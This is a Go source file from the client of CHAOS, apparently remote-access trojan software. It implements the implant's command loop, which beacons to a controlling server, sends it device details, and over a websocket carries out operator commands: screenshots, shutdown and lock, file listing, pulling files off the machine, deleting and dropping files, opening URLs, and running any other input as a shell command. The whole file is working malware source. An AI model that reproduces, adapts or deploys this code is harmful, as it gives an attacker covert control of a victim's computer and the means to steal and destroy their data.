package handler

import (
	"encoding/json"
	"fmt"
	"github.com/gorilla/websocket"
	"github.com/tiagorlampert/CHAOS/client/app/entities"
	"github.com/tiagorlampert/CHAOS/client/app/gateway"
	ws "github.com/tiagorlampert/CHAOS/client/app/infrastructure/websocket"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
	"github.com/tiagorlampert/CHAOS/client/app/utilities/encode"
	"net/http"
	"strings"
	"time"
)

type Handler struct {
	Connection    *websocket.Conn
	Configuration *environment.Configuration
	Gateway       gateway.Gateway
	Services      *services.Services
	ClientID      string
	Connected     bool
}

func NewHandler(
	connection *websocket.Conn,
	configuration *environment.Configuration,
	gateway gateway.Gateway,
	services *services.Services,
	clientID string,
) *Handler {
	return &Handler{
		Connection:    connection,
		Configuration: configuration,
		Gateway:       gateway,
		Services:      services,
		ClientID:      clientID,
	}
}

func (h *Handler) KeepConnection() {
	sleepTime := 30 * time.Second

	for {
		if h.Connected {
			time.Sleep(sleepTime)
		}

		err := h.ServerIsAvailable()
		if err != nil {
			h.Log("[!] Error connecting with server: " + err.Error())
			h.Connected = false
			time.Sleep(sleepTime)
			continue
		}

		err = h.SendDeviceSpecs()
		if err != nil {
			h.Log("[!] Error connecting with server: " + err.Error())
			h.Connected = false
			time.Sleep(sleepTime)
			continue
		}

		h.Connected = true
	}
}

func (h *Handler) Log(v ...any) {
	fmt.Println(v...)
}

func (h *Handler) ServerIsAvailable() error {
	res, err := h.Gateway.NewRequest(http.MethodGet,
		fmt.Sprint(h.Configuration.Server.URL, h.Configuration.Server.Health), nil)
	if err != nil {
		return err
	}
	if res.StatusCode != http.StatusOK {
		return fmt.Errorf("error with status code: %d (%s)", res.StatusCode, string(res.ResponseBody))
	}
	return nil
}

func (h *Handler) SendDeviceSpecs() error {
	deviceSpecs, err := h.Services.Information.LoadDeviceSpecs()
	if err != nil {
		return err
	}
	body, err := json.Marshal(deviceSpecs)
	if err != nil {
		return err
	}
	res, err := h.Gateway.NewRequest(http.MethodPost,
		fmt.Sprint(h.Configuration.Server.URL, h.Configuration.Server.Device), body)
	if err != nil {
		return err
	}
	if res.StatusCode != http.StatusOK {
		return fmt.Errorf("error with status code %d", res.StatusCode)
	}
	return nil
}

func (h *Handler) Reconnect() {
	h.Connected = false
	for {
		conn, err := ws.NewConnection(h.Configuration, h.ClientID)
		if err != nil {
			time.Sleep(time.Second * 10)
			continue
		}

		h.Connection = conn
		h.Connected = true
		h.Log("[*] Successfully connected")
		break
	}
}

func (h *Handler) HandleCommand() {
	for {
		if !h.Connected {
			h.Reconnect()
			continue
		}

		_, message, err := h.Connection.ReadMessage()
		if err != nil {
			h.Log("[!] Error reading from connection:", err)
			h.Reconnect()
			continue
		}

		var command entities.Payload
		if err := json.Unmarshal(message, &command); err != nil {
			continue
		}
		if len(strings.TrimSpace(command.Request)) == 0 {
			continue
		}
		var response []byte
		var hasErr bool

		commandParts := strings.Split(command.Request, " ")

		mainCommand := strings.ToLower(commandParts[0])
		subCommand := strings.Join(commandParts[1:], " ")

		switch mainCommand {
		case "getos":
			deviceSpecs, err := h.Services.Information.LoadDeviceSpecs()
			if err != nil {
				hasErr = true
				response = encode.StringToByte(err.Error())
				continue
			}
			response = encode.StringToByte(encode.PrettyJson(deviceSpecs))
			break
		case "screenshot":
			screenshot, err := h.Services.Screenshot.TakeScreenshot()
			if err != nil {
				hasErr = true
				response = encode.StringToByte(err.Error())
				break
			}
			response = screenshot
			break
		case "restart":
			if err := h.Services.OS.Restart(); err != nil {
				hasErr = true
				response = encode.StringToByte(err.Error())
			}
			break
		case "shutdown":
			if err := h.Services.OS.Shutdown(); err != nil {
				hasErr = true
				response = encode.StringToByte(err.Error())
			}
			break
		case "lock":
			if err := h.Services.OS.Lock(); err != nil {
				hasErr = true
				response = encode.StringToByte(err.Error())
			}
			break
		case "sign-out":
			if err := h.Services.OS.SignOut(); err != nil {
				hasErr = true
				response = encode.StringToByte(err.Error())
			}
			break
		case "explore":
			fileExplorer, err := h.Services.Explorer.ExploreDirectory(subCommand)
			if err != nil {
				response = encode.StringToByte(err.Error())
				hasErr = true
				break
			}
			explorerBytes, _ := json.Marshal(fileExplorer)
			response = explorerBytes
			break
		case "download":
			filepath := strings.TrimSpace(strings.ReplaceAll(command.Request, "download", ""))
			res, err := h.Services.Upload.UploadFile(filepath)
			if err != nil {
				response = encode.StringToByte(err.Error())
				hasErr = true
				break
			}
			response = res
			break
		case "delete":
			filepath := strings.TrimSpace(strings.ReplaceAll(command.Request, "delete", ""))
			err := h.Services.Delete.DeleteFile(filepath)
			if err != nil {
				response = encode.StringToByte(err.Error())
				hasErr = true
				break
			}
			break
		case "upload":
			filepath := strings.TrimSpace(strings.ReplaceAll(command.Request, "upload", ""))
			res, err := h.Services.Download.DownloadFile(filepath)
			if err != nil {
				response = encode.StringToByte(err.Error())
				hasErr = true
				break
			}
			response = res
			break
		case "open-url":
			err := h.Services.URL.OpenURL(subCommand)
			if err != nil {
				response = encode.StringToByte(err.Error())
				hasErr = true
				break
			}
			break
		default:
			response = encode.StringToByte(
				h.Services.Terminal.Run(command.Request, h.Configuration.Connection.ContextDeadline))
		}

		body, err := json.Marshal(entities.Payload{
			ClientID: h.ClientID,
			Response: response,
			HasError: hasErr,
		})
		if err != nil {
			continue
		}

		err = h.Connection.WriteMessage(websocket.BinaryMessage, body)
		if err != nil {
			continue
		}
	}
}
